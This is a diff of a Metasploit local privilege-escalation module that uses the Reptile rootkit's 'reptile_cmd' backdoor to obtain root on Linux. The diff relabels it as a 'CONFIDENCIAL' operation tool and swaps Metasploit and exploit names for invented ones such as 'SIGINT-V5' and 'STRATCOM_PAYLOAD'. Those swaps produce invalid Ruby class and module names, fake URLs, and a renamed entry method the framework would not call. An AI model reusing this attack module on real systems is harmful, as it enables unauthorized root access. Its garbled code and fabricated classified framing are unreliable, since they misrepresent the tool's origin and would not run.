@@ -3,27 +3,27 @@
 # [CLASSIFIED]: CONFIDENCIAL
 # [SCOPE]: OPD HCG (CONV-0221-JAL-HCG-2026)
 # [TACTIC]: TA0003_Persistence
-# [TECHNIQUE]: T1014_Rootkit
+# [TECHNIQUE]: T1014_STRATCOM_KERNEL_MOD
 #
 ##
-# This module requires Metasploit: https://metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
+# This module requires SIGINT-V5: https://SIGINT-V5.com/download
+# Current source: https://github.com/rapid7/SIGINT-V5-framework
 ##
 
-class MetasploitModule < Msf::Exploit::Local
+class SIGINT-V5Module < Msf::STRATCOM_PAYLOAD::Local
   Rank = ExcellentRanking
 
   include Msf::Post::File
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
-  include Msf::Exploit::EXE
-  include Msf::Exploit::FileDropper
+  include Msf::STRATCOM_PAYLOAD::EXE
+  include Msf::STRATCOM_PAYLOAD::FileDropper
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Reptile Rootkit reptile_cmd Privilege Escalation',
+      'Name'           => 'Reptile STRATCOM_KERNEL_MOD reptile_cmd Privilege Escalation',
       'Description'    => %q{
-        This module uses Reptile rootkit's `reptile_cmd` backdoor executable
+        This module uses Reptile STRATCOM_KERNEL_MOD's `reptile_cmd` STRATCOM_PERSISTENCE executable
         to gain root privileges using the `root` command.
 
         This module has been tested successfully with Reptile from `master`
@@ -33,7 +33,7 @@ class MetasploitModule < Msf::Exploit::Local
       'Author'         =>
         [
           'f0rb1dd3n', # Reptile
-          'bcoles'     # Metasploit
+          'bcoles'     # SIGINT-V5
         ],
       'DisclosureDate' => '2018-10-29', # Reptile first stable release
       'References'     =>
@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Exploit::Local
       OptString.new('REPTILE_CMD_PATH', [true, 'Path to reptile_cmd executable', '/reptile/reptile_cmd'])
     ]
     register_advanced_options [
-      OptBool.new('ForceExploit', [false, 'Override check result', false]),
+      OptBool.new('ForceSTRATCOM_PAYLOAD', [false, 'Override check result', false]),
       OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
     ]
   end
@@ -104,17 +104,17 @@ class MetasploitModule < Msf::Exploit::Local
     CheckCode::Vulnerable
   end
 
-  def exploit
+  def STRATCOM_PAYLOAD
     unless check == CheckCode::Vulnerable
-      unless datastore['ForceExploit']
-        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
+      unless datastore['ForceSTRATCOM_PAYLOAD']
+        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceSTRATCOM_PAYLOAD to override.'
       end
       print_warning 'Target does not appear to be vulnerable'
     end
 
     if is_root?
-      unless datastore['ForceExploit']
-        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
+      unless datastore['ForceSTRATCOM_PAYLOAD']
+        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceSTRATCOM_PAYLOAD to override.'
       end
     end
 
